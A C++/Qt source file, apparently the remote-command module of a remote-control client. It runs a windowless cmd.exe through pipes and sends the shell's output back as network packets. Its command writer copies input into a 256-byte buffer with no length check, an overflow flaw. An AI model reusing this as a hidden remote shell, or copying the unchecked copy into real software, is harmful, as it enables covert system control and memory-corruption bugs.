#include "cmdthread.h"

CMDThread::CMDThread()
{

}


void CMDThread::exctCMD(char *data)
{
    char szBuf[256] = { 0 };
    int len = strlen(data);
    memcpy(szBuf, data, len);
    if (len > 0) {
        szBuf[len++] = '\n';
        unsigned int nWritedLength = 0;
        WriteFile(hMyWritePipe,
            szBuf,
            len,
            reinterpret_cast<LPDWORD>(&nWritedLength),
            NULL //与异步有关
        );//TODO
    }
}

void CMDThread::run()
{

    //CreatePipe
    HANDLE hCmdReadPipe;
    HANDLE hMyReadPipe;
    HANDLE hCmdWritePipe;
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    CreatePipe(&hCmdReadPipe, &hMyWritePipe, &sa, 0);
    CreatePipe(&hMyReadPipe, &hCmdWritePipe, &sa, 0);

    //创建cmd并替换标准输入输出
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES;//标志位，开启句柄替换的标志
    si.hStdInput = hCmdReadPipe;
    si.hStdOutput = hCmdWritePipe;
    si.hStdError = hCmdWritePipe;

    bool bRet = CreateProcessW(
        TEXT("C:\\Windows\\SysWOW64\\cmd.exe"),//被启动的程序路径
        NULL,//命令行参数
        NULL,//进程句柄继承属性
        NULL,//线程句柄继承属性
        TRUE,//继承开关
        CREATE_NO_WINDOW,//无窗口
        NULL,//环境变量
        NULL,//当前路径
        &si, //进程的启动信息
        &pi  //接收进程的标识信息
    );
    char szOutBuf[256] = { 0 };
    DWORD nReadBytes = 0;
    while(!isStop){
        memset(szOutBuf, 0, 256);
        ReadFile(
            hMyReadPipe,
            szOutBuf,
            255,
            &nReadBytes,
            NULL);//TODO
        if (nReadBytes > 0){
            QTextCodec *codec = QTextCodec::codecForName("GBK");
            QString outString = codec->toUnicode(szOutBuf);
            QByteArray data = outString.toUtf8();
            emit client_send_data((int)common::packetType::cmd, data);
        }
    }
}
